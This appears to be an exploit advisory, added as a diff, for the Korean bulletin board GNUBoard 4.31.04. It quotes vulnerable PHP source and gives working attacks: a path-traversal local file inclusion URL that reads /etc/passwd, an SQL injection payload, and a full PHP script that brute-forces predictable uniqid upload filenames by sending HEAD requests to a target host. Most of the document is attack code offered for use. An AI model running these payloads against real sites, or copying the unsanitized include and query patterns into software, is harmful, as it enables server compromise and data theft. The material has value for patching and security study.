@@ -1,0 +1,230 @@
+GNUBoard V4.31.04 (09.01.30) Multiple Local/Remote Vulnerability
+bY make0day@gmail.com
+
+/*************************
+
+SIR GNUBoard (VERSION 4.31.04 (09.01.30))is a widely used bulletin board system of Korea.
+It is freely available for all platforms that supports PHP and MySQL.
+But we find a file include vulnerability affects SIR GNUBoard.
+In special conditions,it may be used as a remote file include vulnerability .
+This issue  to  execute arbitrary  PHP code on an affected computer with the privileges of the affected Web server.
+Here is the details:
+
+**************************/
+TEST ON VERSION 4.31.04 (08.01.30)
+
+/***************************
+Local File Inclusion Vulnerability
+
+/poll_result.php
+
+include_once("./_common.php");
+
+$po = sql_fetch(" select * from $g4[poll_table] where po_id = '$po_id' ");
+if (!$po[po_id]) 
+
+¡Š¡Š
+
+echo "<script language='javascript' src='$g4[path]/js/sideview.js'></script>";
+
+if (!$skin_dir) $skin_dir = "basic";
+$poll_skin_path = "$g4[path]/skin/poll/$skin_dir";
+include_once ("$poll_skin_path/poll_result.skin.php");	//file include
+
+*************************/
+
+poc:
+http://test.com/GnuBoard/bbs/poll_result.php?po_id=177&skin_dir=../../../../../../../../etc/passwd%00
+
+/***************************
+SQL Injection Vulnerability
+
+/register_form.skin.php
+
+<?
+if (!defined("_GNUBOARD_")) exit;
+?>
+
+<style type="text/css">
+<!--
+
+¡Š¡Š
+
+function fregisterform_submit(f) 
+{
+    if (f.w.value == "") {
+
+        reg_mb_id_check();
+
+        if ($F('mb_id_enabled')!='000') {	
+            alert('Èž¿øŸÆÀÌµðžŠ ÀÔ·ÂÇÏÁö ŸÊŸÒ°Å³ª ÀÔ·Â¿¡ ¿À·ù°¡ ÀÖœÀŽÏŽÙ.');
+            $('reg_mb_id').activate();
+            return false;
+        }
+    }
+	//WTF javascript~!!, We can inject sql query at mb_id, It wasn`t addslushed
+
+/point.php
+<?
+include_once("./_common.php");
+
+¡Š¡Š
+
+$sql_common = " from $g4[point_table] where mb_id = '$member[mb_id]' "; //mb_id
+
+¡Š¡Š
+
+                $sql = " select * 
+                          $sql_common
+                          $sql_order
+                          limit $from_record, $rows ";
+
+*************************/
+
+poc:
+mb_id = admin' or 1=1#
+
+/***************************
+File name disclosure Vulnerability
+
+/register_form_update.php
+
+<?
+$g4[title] = $wr_subject . "±ÛÀÔ·Â";
+include_once("./_common.php");
+
+@include_once("$board_skin_path/write_update.head.skin.php");
+
+¡Š¡Š
+
+$filename = preg_replace("/\.(php|phtm|htm|cgi|pl|exe|jsp|asp|inc)/i", "$0-x", $filename);
+$upload[$i][file] = abs(ip2long($_SERVER[REMOTE_ADDR])).'_'.substr(md5(uniqid($g4[server_time])),0,8).'_'.str_replace('%', '', urlencode($filename)); 
+//Key point
+$dest_file = "$g4[path]/data/file/$bo_table/" . $upload[$i][file];
+
+
+1) uniqid is just unix time stamp + usec(micro time),
+2) yeah, We can brute force usec in 0 ~ 0x100000 range
+3) Also, We can upload two files when write a post,
+4) By uploading image file, we can get encoded file name ex) http://test.com/GnuBoard/data/file/happy/747682804_462b38f4_1.jpg
+5) By uploading txt file, we can get exact time (y/m/d/h/m/s) ex) DATE : 2009-01-30 08:35:49
+-> As a result, We can use arbitrary file for Local file inclusion 
+
+*************************/
+
+poc:
+
+/MicrosecBrute.php
+
+<html>
+<head>
+<title>test</title>
+</head>
+<body>
+<xmp>
+
+<?
+////////////////////////////////////////////////////////////////////////////////
+//http://test.com/GnuBoard/data/file/happy/747682804_462b38f4_1.jpg
+
+$t_host = "test.com";	//target host
+$t_dir = "/GnuBoard/data/file/happy/"; //upload directory
+$encodedimgname = "747682804_462b38f4_1.jpg";	//Encoded Image file name
+$imgname = "1.jpg";	//Upload img file name
+$fname = "test.txt";	//Upload wanted file name
+$year = "2009";	//file upload time 2009-01-30 08:35:49
+$mon = "01";
+$day = "30";
+$hour = "08";
+$min = "35";
+$sec = "49";
+$ip = $_SERVER[REMOTE_ADDR];	//Attacker IP
+/////////////////////////////////////////////////////////////////////////////////
+
+$longip = abs(ip2long($ip));
+$encfname = urlencode($fname);
+$encimgname = urlencode($imgname);
+$time = mktime ($hour, $min, $sec, $mon, $day, $year); 
+$prefix = $time;
+$_date = date ("Y m j g i a s", $time);
+
+echo "IP : $ip\n";
+echo "Wanted File : $encfname\n";
+echo "Img File : $encimgname\n";
+echo "time : $_date\n";
+echo "dir : ".$t_host.$t_dir."\n";
+
+ob_flush();
+flush();
+?>
+
+<?
+for($i = 0; $i < 0x100000; $i++)	//Find img upload time
+{
+	$uniq_id = sprintf("%s%08x%05x",$prefix,$time,$i);
+	$fullname = $longip.'_'.substr(md5($uniq_id),0,8).'_'.$encimgname;
+
+	if(stristr($fullname,$encodedimgname))
+	{
+		$img_time = $i;
+		break;
+	}
+
+}
+
+echo "Image file upload usec : $img_time\n";
+ob_flush();
+flush();
+
+?>
+<?
+
+for($i = $img_time; $i < 0x100000; $i++)	//Find wanted upload time
+{
+	$uniq_id = sprintf("%s%08x%05x",$prefix,$time,$i);
+	$fullname = $longip.'_'.substr(md5($uniq_id),0,8).'_'.$encfname;
+	
+	$ret = myGet($t_host, $t_dir.$fullname);	
+
+	if(stristr($ret,"200 OK"))
+	{
+		echo "200 OK :) URL : http://".$t_host.$t_dir.$fullname."\n";
+		exit();
+	}
+
+
+}
+
+echo "404 Not Found :(\n";
+
+
+ function myGet($host, $target, $port = 80)
+ {
+
+  $request  = "HEAD $target HTTP/1.1\r\n";
+  $request .= "Host: $host\r\n";
+  $request .= "User-Agent: Mozilla/4.0\r\n";
+  $request .= "Accept: text/html\r\n";
+  $request .= "Connection: close\r\n";
+  $request .= "\r\n";
+
+  $socket  = fsockopen($host, $port, $errno, $errstr, 100);
+  fputs($socket, $request);
+  $ret = "";
+  while(!feof($socket))
+   $ret .= fgets( $socket, 4096 );
+
+  fclose( $socket );
+
+  return $ret;
+ }
+
+?>
+</xmp>
+</body>
+</html>
+
+*************************/
+Result : http://test.com/GnuBoard/data/file/happy/747682804_d57d84be_test.txt 
+
+# milw0rm.com [2009-01-30]
